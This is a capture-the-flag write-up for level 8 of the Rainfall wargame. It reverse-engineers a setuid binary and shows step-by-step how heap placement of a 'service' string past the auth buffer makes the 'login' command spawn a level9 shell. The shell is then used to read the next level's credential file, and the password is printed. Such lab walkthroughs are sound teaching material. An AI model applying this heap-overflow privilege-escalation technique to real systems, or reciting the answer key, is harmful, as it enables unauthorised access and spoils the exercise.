# Rainfall Level 8 Guide
This guide will walk you through the process of finding the password for the `level8` user.

## 1. Examine your environment
   
`id` : Shows user and group identities that you have.
```bash
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/level8
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
```

We can see that the `level8` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `level9`. It executable by the `users` group, our current group.

We execute the binary to see what it does. It waiting fon an input, but every times it prints `(nil), (nil)`.
```bash
level6@RainFall:~$ ./level8
test
(nil), (nil) 
aaa
(nil), (nil) 
bbb
(nil), (nil)
```

## 2. Reverse engineering

We will use Ghidra to reverse engineer the binary.
You can find the analysis in [Ressources/ghidra_analyse_level8.c](Ressources/ghidra_analyse_level8.c), and the reconstructed C code in [source.c](source.c).

## 3. Analysis

We find a main function, which is very long. You will find the source code rebuild in the [source_code_rebuild.c](Ressources/source_code_rebuild.c) file, and the simplified source code in the [source.c](source.c) file.
We will use the simplified source code to explain the vulnerability.

We can see `system("/bin/sh")` at the end of the main function. We need to find a way to execute this command.
```c
int main(void)
{
  char input[128];
  uint uVar4;
  char local_8b[2];
  char acStack_89 [125];
  
  do {
    printf("%p, %p\n", auth, service);
    if (fgets(input,0x80,stdin) == NULL) {
        return 0;
    }
    if (strncmp(input, "auth ", 5) == 0) {
        auth = malloc(4);
	    auth[0] = 0;
        uVar4 = strlen(input + 5);
        if (uVar4 < 31) {
            strcpy((char *)auth, input + 5);
        }
    }
    if (strncmp(input, "reset", 5) == 0) {
        free(auth);
    }
    if (strncmp(input, "service", 7) == 0) {
        service = strdup(input + 7);
    }
    if (strncmp(input, "login", 5) == 0) {
        if (auth != NULL && auth[32] == 0) {
            fwrite("Password:\n", 1, 10, stdout);
        } else {
            system("/bin/sh");
        }
    }
  } while( true );
}
```
This programm take an input, and if the input begins with `auth`, it will copy the input after `auth` in the `auth` variable, if the length of the input after `auth ` is less than 31.
If the input begins with `reset`, it will free the `auth` variable.
If the input begins with `service`, it will copy the input after `service` in the `service` variable.
If the input begins with `login`, it will check if the `auth` variable is not `NULL` and the 32th byte of the `auth` variable is `0`. If it is the case, it will print `Password:`. If not, it will execute `system("/bin/sh")`.

## 4. Exploitation

So if we write `auth `, the `auth` variable will be set to nothing.
```bash
auth 
0x804a038, (nil)
```
`0x804a038` is the address of the `auth` variable, after malloc.
```bash
service
0x804a038, 0x804a048
```
`0x804a048` is the address of the `service` variable, after strdup.
We can see that the `service` variable is just after the `auth` variable in memory.
Indeed, malloc allocate memory following the last memory allocation.

Between `0x804a038` and `0x804a048`, there is 16 bytes of memory.
We want to overflow the `auth[32]` byte.
If `auth[0]` is at the address `0x804a038`, `auth[32]` is at the address `0x804a038 + 32 = 0x804a058`.
`service` is at the address `0x804a048`, so we need to write 16 bytes in the `service` variable to overflow the `auth[32]` byte.
1 char == byte, so we need to write 16 characters to overflow the `auth[32]` byte.

```c
if (strncmp(input, "service", 7) == 0) {
    service = strdup(input + 7);
}
```
`strdup` will copy (and `malloc`) the input after `service` in the `service` variable. So we can write 16 characters after `service` to have 16 bytes in the `service` variable.

```bash
service0123456789012345
0x804a038, 0x804a048
```

Now, if we write `login`, the program will check if the 32th byte of the `auth` variable is `0`. If it's not the case, it will execute `system("/bin/sh")`.
```bash
login
$ 
```

We have the shell ! We can check if we have the `level9` rights.
```bash
$ whoami
level9
```

So we can read the password in the `/home/user/level9/.pass` file.
```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Congratulations!
We can now connect to the `level9` user with this password.
```bash
level8@RainFall:~$ su level9
Password:
level9@RainFall:~$
```
